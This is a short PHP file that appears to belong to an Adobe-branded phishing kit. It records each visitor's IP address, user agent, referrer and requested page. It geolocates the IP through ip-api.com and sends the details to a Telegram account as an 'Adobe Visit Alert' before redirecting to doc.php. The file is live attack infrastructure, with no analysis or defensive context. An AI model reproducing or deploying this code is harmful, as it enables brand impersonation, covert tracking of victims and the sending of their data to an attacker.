<?php
require_once 'settings.php';

/* ================== COLLECT VISITOR DETAILS ================== */
$ip      = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$agent   = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct / None';
$time    = date("Y-m-d H:i:s");
$page    = $_SERVER['REQUEST_URI'] ?? 'UNKNOWN';
$host    = $_SERVER['HTTP_HOST'] ?? 'UNKNOWN';

/* ================== GEOIP LOOKUP ================== */
$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
$country = $geo['country'] ?? 'Unknown';
$city    = $geo['city'] ?? 'Unknown';
$region  = $geo['regionName'] ?? 'Unknown';
$isp     = $geo['isp'] ?? 'Unknown';

/* ================== MESSAGE FORMAT ================== */
$message = "🔔<b> Adobe Visit Alert </b>🔔\n\n" .
           "🕒 Time: $time\n" .
           "🧬 IP: $ip\n" .
           "🌍 Country: $country\n\n" .
           "🏘 City: $city\n" .
           "📡 Region: $region\n" .
           "🧭 ISP: $isp\n\n" .
           "🌐 Host: $host\n" .
           "🔗 Page: $page\n" .
           "💻 Referer: $referer\n\n" .
           "📜 User-Agent: $agent\n\n" .
           "📍 <b>tg-@Meyerlowkee</b> 📍";

/* ================== SEND TO TELEGRAM ================== */
sendTelegramMessage($message);

/* ================== REDIRECT USER ================== */
header("Location: doc.php");
exit;
